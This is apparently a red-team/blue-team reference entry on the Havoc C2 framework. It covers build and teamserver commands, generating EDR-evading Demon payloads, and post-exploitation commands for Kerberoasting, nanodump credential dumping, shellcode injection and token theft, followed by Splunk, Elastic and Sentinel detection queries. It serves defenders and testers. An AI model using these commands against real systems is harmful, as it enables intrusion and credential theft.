name: Havoc C2 - Modern Command & Control Framework
description: Havoc is a modern, open-source C2 framework designed as a Cobalt Strike alternative. It features a Demon agent with sleep obfuscation (Ekko/Foliage), indirect syscalls, SMB/HTTP/HTTPS listeners, BOF (Beacon Object File) compatibility, and a Qt-based teamserver GUI. Used in advanced engagements where Cobalt Strike is unavailable.
notes:
=== INSTALL ===
  git clone https://github.com/HavocFramework/Havoc
  cd Havoc
  make ts-build    # Build teamserver
  make client-build # Build client GUI

=== START TEAMSERVER ===
  ./havoc server --profile profiles/default.yaotl
  # Profile defines listeners, operators, demon config

=== CONNECT CLIENT ===
  ./havoc client
  # Connect to teamserver IP:40056

=== GENERATE DEMON PAYLOAD ===
  # In GUI: Payloads > Generate
  # Options: Windows EXE/DLL/Shellcode, Sleep technique (Ekko/Foliage)
  # Indirect syscalls: Yes (bypasses EDR hooks)

=== KEY FEATURES ===
- Demon agent: sleep obfuscation, indirect syscalls, stack spoofing
- BOF support: run Cobalt Strike BOFs directly
- SMB pivoting: lateral movement through named pipes
- COFF loader: execute compiled C code in-memory
- Token manipulation: steal/impersonate tokens
- Inline assembly: execute shellcode in Demon process

=== MODULES (post-exploitation) ===
  dotnet inline-execute Rubeus.exe kerberoast
  bof inline-execute nanodump.x64.o
  shellcode inject x64 <pid> /path/to/shellcode.bin
  token steal <pid>

defense.why_it_works: Havoc uses indirect syscalls to bypass EDR userland hooks, sleep obfuscation (Ekko/Foliage) to avoid memory scanning, and encrypted C2 channels. The Demon agent is fully in-memory with no on-disk artifacts.
defense.prerequisites: Havoc teamserver running; initial code execution on target for payload delivery.
defense.impact: Full remote control of compromised systems; lateral movement; credential theft; data exfiltration.
defense.detection: [MITRE T1071.001] HTTP/HTTPS beaconing patterns; indirect syscall indicators; sleep obfuscation memory artifacts.
defense.artifacts: Network beaconing to C2 server; named pipe creation for SMB pivoting; in-memory .NET assembly loading.
defense.splunk_spl:
index=sysmon (EventCode=3 AND NOT dest_port IN (80,443,53))
| stats count by Image, dest_ip, dest_port
| where count > 10
| sort -count
defense.elastic_kql: event.code:"3" AND NOT destination.port:(80 OR 443 OR 53)
defense.sentinel_kql:
DeviceNetworkEvents
| where RemotePort !in (80, 443, 53)
| summarize ConnectionCount=count() by InitiatingProcessFileName, RemoteIP, RemotePort, bin(Timestamp, 1h)
| where ConnectionCount > 10
defense.prevention: EDR with kernel-level telemetry; network monitoring for beaconing; block unknown outbound connections; application allowlisting.

detections.name: C2 beaconing pattern detection
detections.logic:
DeviceNetworkEvents
| where ActionType == "ConnectionSuccess"
| summarize Connections=count(), AvgInterval=avg(Timestamp - prev(Timestamp)) by InitiatingProcessFileName, RemoteIP, bin(Timestamp, 1h)
| where Connections > 20
| project InitiatingProcessFileName, RemoteIP, Connections
detections.false_positives: Auto-update services; health check endpoints; legitimate polling applications
detections.tuning: Analyze jitter patterns; compare against known-good beaconing (Windows Update, AV updates)
